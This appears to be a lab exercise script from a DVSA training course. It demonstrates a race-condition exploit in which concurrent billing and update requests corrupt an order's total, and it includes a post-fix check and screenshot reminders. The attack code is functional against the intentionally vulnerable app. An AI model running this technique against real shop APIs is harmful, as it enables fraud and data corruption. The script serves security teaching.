#!/bin/bash
# =============================================================================
# Lesson #8: Logic Vulnerabilities (Race Condition) — Exploit & Fix Script
# DVSA Vulnerability: No atomic lock between billing and order update
# =============================================================================
# Usage: bash lesson08_logic_vulnerabilities.sh <API_URL> <TOKEN>
# =============================================================================

set -euo pipefail

API_URL="${1:?Usage: $0 <API_URL> <JWT_TOKEN>}"
TOKEN="${2:?Provide a valid JWT token}"
ORDER_ENDPOINT="${API_URL}"

echo "============================================"
echo " Lesson #8: Logic Vulnerabilities"
echo " Race Condition in Order Billing Workflow"
echo "============================================"
echo ""

# Step 1: Create a new order with 1 item
echo "[*] Step 1: Creating new order with 1 item..."
RESPONSE=$(curl -s "${ORDER_ENDPOINT}" \
  -H "content-type: application/json" \
  -H "authorization: ${TOKEN}" \
  --data-raw '{"action":"new","cart-id":"race-cart-001","items":{"Ring King":1}}')
echo "$RESPONSE" | python3 -m json.tool
echo ""

ORDER_ID=$(echo "$RESPONSE" | python3 -c "import sys,json; print(json.load(sys.stdin)['order-id'])" 2>/dev/null || true)
if [[ -z "$ORDER_ID" ]]; then
    echo "[!] Could not extract order-id. Exiting."
    exit 1
fi
echo "[*] Order ID: ${ORDER_ID}"
echo ""

# Step 2: Check order status before exploit
echo "[*] Step 2: Checking order status before race condition..."
curl -s "${ORDER_ENDPOINT}" \
  -H "content-type: application/json" \
  -H "authorization: ${TOKEN}" \
  --data-raw "{\"action\":\"orders\"}" | python3 -m json.tool
echo ""

# Step 3: Launch race condition
echo "[*] Step 3: Launching race condition — billing and update simultaneously..."
echo "[*] Sending billing request in background..."
curl -s "${ORDER_ENDPOINT}" \
  -H "content-type: application/json" \
  -H "authorization: ${TOKEN}" \
  --data-raw "{\"action\":\"billing\",\"order-id\":\"${ORDER_ID}\",\"data\":{\"ccn\":\"4242424242424242\",\"exp\":\"12/25\",\"cvv\":\"123\"}}" &

echo "[*] Immediately sending update request to change quantity to 5..."
curl -s "${ORDER_ENDPOINT}" \
  -H "content-type: application/json" \
  -H "authorization: ${TOKEN}" \
  --data-raw "{\"action\":\"update\",\"order-id\":\"${ORDER_ID}\",\"items\":{\"Ring King\":5}}"

wait
echo ""
echo "[*] Both requests completed."
echo ""

# Step 4: Check DynamoDB via orders list
echo "[*] Step 4: Checking order state after race condition..."
curl -s "${ORDER_ENDPOINT}" \
  -H "content-type: application/json" \
  -H "authorization: ${TOKEN}" \
  --data-raw "{\"action\":\"orders\"}" | python3 -m json.tool
echo ""

echo "[*] KEY EVIDENCE TO CHECK IN DYNAMODB CONSOLE:"
echo "    → totalAmount should be 0 (corruption)"
echo "    → itemList should be empty (corruption)"
echo "    → orderStatus may be inconsistent"
echo ""

# Step 5: Post-fix verification
echo "[*] Step 5: Post-fix verification..."
echo "[*] Attempting to update an already paid order..."
PAID_ORDER_ID="${3:-}"
if [[ -n "$PAID_ORDER_ID" ]]; then
    curl -s "${ORDER_ENDPOINT}" \
      -H "content-type: application/json" \
      -H "authorization: ${TOKEN}" \
      --data-raw "{\"action\":\"update\",\"order-id\":\"${PAID_ORDER_ID}\",\"items\":{\"Ring King\":5}}" | python3 -m json.tool
else
    echo "[!] No paid order ID provided for post-fix verification."
    echo "    Run: bash $0 <API_URL> <TOKEN> <PAID_ORDER_ID>"
fi
echo ""

echo "[*] SCREENSHOT REMINDERS:"
echo "    1. New order created showing order-id"
echo "    2. Terminal showing billing and update ran simultaneously"
echo "    3. DynamoDB record showing totalAmount:0 and empty itemList"
echo "    4. DVSA-ORDER-BILLING code — no atomic lock (if status < 120)"
echo "    5. DVSA-ORDER-UPDATE code — insufficient check (orderStatus > 110)"
echo "    6. Post-fix: paid order update rejected with error message"
